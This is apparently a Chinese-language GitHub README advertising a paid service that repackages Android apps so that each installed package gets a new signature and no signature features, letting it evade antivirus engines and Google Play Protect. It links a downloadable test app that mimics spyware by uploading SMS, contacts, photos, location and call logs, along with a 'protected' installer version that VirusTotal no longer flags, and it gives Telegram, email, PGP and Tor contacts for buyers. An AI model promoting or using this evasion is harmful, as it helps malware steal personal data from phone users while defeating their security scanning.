# 安卓报毒解决

## 介绍

不同于传统服务器代码加密 + 重复签名方案，该方案在只服务器端处理一次代码和资源，然后生成安装器下发用户，实现每次落地包都是全新签名且无特征。本方案极少使用反射，而使用android官方提供的稳定api实现代码、资源融合。因此在较新android版本（8.0+, 市场占有率95%+）上都可稳定运行，且与各品牌改动后的rom保持高兼容。本方案理论上长期有效。

## 示例

1. [此应用](https://github.com/android-virus-scan-bypass/android-virus-scan-bypass-pub/releases/download/v1.0.0/original.apk)是模仿恶意应用行为（读取并上传sms，通讯录，照片，地理位置，通话记录等信息）开发的测试应用，virustotal多引擎[查出病毒](https://www.virustotal.com/gui/file/9b3c0e7b7bb015aaa8635c2e37208d6c406e5b5d631b994f5811932374da9cb5). Google 检测见图。重新打包进安装器（[点此下载测试安装器](https://github.com/android-security-scan-bypass/android-security-scan-bypass-pub/releases/download/v1.0.0/protected-installer.apk)）再安装后则正常（[处理后 virustotal 报告](https://www.virustotal.com/gui/file/58ba4b98bb43ee953ef9fdb02bcc9594b368fe83963b1975130ba58a5112317e)）（国外设备，基于 android 13）。完整视频[在此](https://github.com/user-attachments/assets/9a74b45e-f142-442e-b5d1-4c8033cd712d)。
   
   > ![detected](./assets/detected.png)

2. 以下视频录制了另外一个真实案例（基于vivo，android 14）（为保护客户隐私，此apk不提供下载）

https://github.com/user-attachments/assets/874bbd35-98ea-443d-8db3-061663b1ecac

## 合作

- [TG客服](https://t.me/m/8UuSfBj2Y2Vh)

- 邮箱：[play-protect-bypass@proton.me](mailto:play-protect-bypass@proton.me)
  
  - GPG 公钥
  
  - > ```
    > -----BEGIN PGP PUBLIC KEY BLOCK-----
    > 
    > mDMEZvrbKRYJKwYBBAHaRw8BAQdApMYCkhGrg8nJ1wC/MCHQdPT2xt29HiGbVbSq
    > eNB1sQS0Okdvb2dsZSBQbGF5IFByb3RlY3QgQnlwYXNzIDxwbGF5LXByb3RlY3Qt
    > YnlwYXNzQHByb3Rvbi5tZT6ImQQTFgoAQRYhBLM8aXFLSzHAqgcvKlIrif955Crn
    > BQJm+tspAhsDBQku/geABQsJCAcCAiICBhUKCQgLAgQWAgMBAh4HAheAAAoJEFIr
    > if955Crns2wA/jbAlrZtVP11aNHvERHCne3NgjquyIHyaR2fj43ZlnGxAP49RtMJ
    > WlfM/dXGQhzGB/+NkZFZ0q+FygJfK0wqfW6BBrg4BGb62ykSCisGAQQBl1UBBQEB
    > B0CqaCwWRUGgqHMHrO5c479kPWpM4vUVArkCX85I4XHIEwMBCAeIfgQYFgoAJhYh
    > BLM8aXFLSzHAqgcvKlIrif955CrnBQJm+tspAhsMBQku/geAAAoJEFIrif955Crn
    > NUUBAIYqWiAmUsSsxWlDUu02E6lcGfxETrryN0Qvdsaf8UIIAP9865wxleWEGU8h
    > gZgME+G1kY91nNTyu2ucn/G7Y8eAAQ==
    > =q6GV
    > -----END PGP PUBLIC KEY BLOCK-----
    > ```

- tor网络地址防止失联：
  
  - ```
    http://bypass7vckrcx6e3655el3a74236ixvxwtivhqirdh6rmrtaqvwzjqyd.onion/
    ```
